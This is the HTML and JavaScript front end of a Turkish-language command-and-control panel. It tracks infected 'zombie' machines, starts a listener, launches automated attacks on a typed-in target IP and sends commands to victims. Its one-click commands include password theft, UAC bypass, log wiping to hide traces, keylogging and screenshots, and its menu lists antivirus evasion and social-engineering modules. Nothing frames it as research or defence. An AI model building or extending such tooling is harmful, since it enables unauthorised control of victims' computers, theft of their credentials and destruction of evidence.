<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>C2 Karargah - Elite Dashboard</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
    <header class="glass-panel">
        <div class="logo">
            <div class="logo-icon">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
            <h1>C2 <span>Karargah</span></h1>
        </div>
        <div class="status-bar">
            <div class="status-badge">
                <div id="status-indicator" class="indicator"></div>
                <span id="status-text">Dinleyici Kapalı</span>
            </div>
            <div class="status-badge">
                Zombiler: <strong id="zombi-count" style="color:var(--secondary); font-family:'Fira Code'; margin-left:8px;">0</strong>
            </div>
        </div>
    </header>

    <div class="dashboard-grid">
        <!-- Sidebar -->
        <div class="sidebar glass-panel">
            <div class="sidebar-section">
                <h2>Hızlı İşlemler</h2>
                <div class="input-group" style="margin-bottom: 10px;">
                    <input type="number" id="listen-port" value="443" placeholder="Port">
                    <button class="btn btn-primary" onclick="startListener()">Dinle</button>
                </div>
            </div>

            <div class="sidebar-section">
                <h2>Oto-Pwn Motoru</h2>
                <div class="input-group">
                    <input type="text" id="target-ip" placeholder="Hedef IP (Örn: 192.168.1.5)">
                    <button class="btn btn-primary" onclick="startAutoPwn()">Saldır</button>
                </div>
            </div>

            <div class="sidebar-section">
                <h2>Sistem Modülleri</h2>
                <div class="menu-list">
                    <button class="btn" onclick="logMsg('Terminaldeki C2_Karargah.py menüsünden başlatın.')">01_Antivirus_Atlatma</button>
                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">04_Ag_Kesif_Araclari</button>
                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">06_Sifre_Kirici</button>
                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">10_Sosyal_Muhendislik</button>
                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">12_Web_Zafiyet</button>
                </div>
            </div>
        </div>

        <!-- Main Area -->
        <div class="main-area">
            
            <!-- Zombiler -->
            <div class="glass-panel zombi-list" id="zombi-list-container">
                <div class="zombi-list-header">
                    <h2>AKTİF BAĞLANTILAR</h2>
                </div>
                <div id="zombi-list">
                    <p style="color:var(--text-muted); font-family:'Fira Code';">Sinyal bekleniyor...</p>
                </div>
            </div>

            <!-- Terminal -->
            <div class="glass-panel terminal-container">
                <div class="terminal-header">
                    <span class="terminal-title" id="term-title">Bağlantı Bekleniyor</span>
                    <button class="cmd-btn danger" onclick="sendCommand('!PANIK')">☠️ PANİK (Kill-Switch)</button>
                </div>
                
                <div class="terminal-output" id="terminal-output">C2 Karargah Merkezi Sistemlerine Bağlanıldı.
[!] Uçtan uca şifreleme (E2EE) devrede.
[!] Bir kurban seçin ve komut göndermeye başlayın.</div>
                
                <div class="terminal-controls">
                    <div class="quick-commands">
                        <button class="cmd-btn" onclick="sendCommand('whoami')">whoami</button>
                        <button class="cmd-btn" onclick="sendCommand('sysinfo')">sysinfo</button>
                        <button class="cmd-btn" onclick="sendCommand('!screenshot')">📸 Screenshot</button>
                        <button class="cmd-btn" onclick="sendCommand('!steal_passwords')">🔑 Şifreleri Çal</button>
                        <button class="cmd-btn" onclick="sendCommand('!getsystem')">👑 UAC Bypass</button>
                        <button class="cmd-btn" onclick="sendCommand('!clear_logs')">🧹 İzleri Sil</button>
                        <button class="cmd-btn" onclick="sendCommand('!keylog_start')">⌨️ Keylogger Başlat</button>
                        <button class="cmd-btn" onclick="sendCommand('!keylog_dump')">⌨️ Keylog Oku</button>
                    </div>

                    <div class="terminal-input-wrapper">
                        <span class="prompt">C2></span>
                        <input type="text" id="term-input" class="terminal-input" placeholder="Sistem komutu girin..." onkeypress="handleEnter(event)">
                        <button class="btn btn-primary" style="width:100px; padding: 8px 15px;" onclick="sendInputCmd()">Çalıştır</button>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script>
        let currentSession = null;

        function logMsg(msg, isErr=false) {
            const out = document.getElementById('terminal-output');
            const color = isErr ? '#ff0055' : 'var(--success)';
            out.innerHTML += `\n<span style="color:${color}">${msg}</span>`;
            out.scrollTop = out.scrollHeight;
        }

        async function startListener() {
            const port = document.getElementById('listen-port').value;
            logMsg(`[*] Dinleyici ${port} portunda başlatılıyor...`);
            try {
                const res = await fetch('/api/start_listener', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({port: port})
                });
                const data = await res.json();
                if(data.status === 'success') {
                    document.getElementById('status-indicator').className = 'indicator active';
                    document.getElementById('status-text').innerText = `Sistem Aktif (${port})`;
                    logMsg(`[+] ${data.message}`);
                } else {
                    logMsg(`[-] Hata: ${data.message}`, true);
                }
            } catch(e) { logMsg(`[-] İstek hatası: ${e}`, true); }
        }

        async function startAutoPwn() {
            const ip = document.getElementById('target-ip').value;
            if(!ip) return alert('Hedef IP girin!');
            logMsg(`[*] Otopilot motoru ateşlendi. Hedef: ${ip}`);
            try {
                await fetch('/api/autopwn', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: ip})
                });
            } catch(e) {}
        }

        async function updateSessions() {
            try {
                const res = await fetch('/api/sessions');
                const data = await res.json();
                const list = document.getElementById('zombi-list');
                document.getElementById('zombi-count').innerText = data.sessions.length;
                
                if(data.sessions.length === 0) {
                    list.innerHTML = '<p style="color:var(--text-muted); font-family:\'Fira Code\';">Sinyal bekleniyor...</p>';
                } else {
                    let html = '';
                    data.sessions.forEach(s => {
                        html += `
                            <div class="zombi-card">
                                <div class="zombi-info">
                                    <strong>ZOMBI-${s.id}</strong>
                                    <span>${s.ip}:${s.port}</span>
                                </div>
                                <button class="btn" onclick="selectSession(${s.id}, '${s.ip}')">Erişim Sağla</button>
                            </div>
                        `;
                    });
                    list.innerHTML = html;
                }
            } catch(e) {}
        }

        function selectSession(id, ip) {
            currentSession = id;
            document.getElementById('term-title').innerText = `Zombi [${id}] - ${ip}`;
            logMsg(`\n[+] C2 bağlantısı kuruldu. Hedef: Zombi-${id}`);
        }

        async function sendCommand(cmd) {
            if(currentSession === null) {
                logMsg(`[-] Komut reddedildi: Önce bir hedef sistem seçin.`, true);
                return;
            }
            logMsg(`\n<span style="color:var(--secondary)">Zombi-${currentSession}></span> ${cmd}`, false);
            
            try {
                const res = await fetch('/api/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({session_id: currentSession, command: cmd})
                });
                const data = await res.json();
                if(data.status === 'success') {
                    logMsg(data.output);
                } else {
                    logMsg(data.message, true);
                    if(data.message.includes('koptu') || data.message.includes('kesildi')) {
                        currentSession = null;
                        document.getElementById('term-title').innerText = `Bağlantı Kesildi`;
                    }
                }
            } catch(e) {
                logMsg(`[-] Sinyal Hatası: ${e}`, true);
            }
            updateSessions();
        }

        function handleEnter(e) {
            if(e.key === 'Enter') sendInputCmd();
        }

        function sendInputCmd() {
            const el = document.getElementById('term-input');
            const cmd = el.value.trim();
            if(cmd) {
                sendCommand(cmd);
                el.value = '';
            }
        }

        setInterval(updateSessions, 3000);
        updateSessions();
    </script>
</body>
</html>
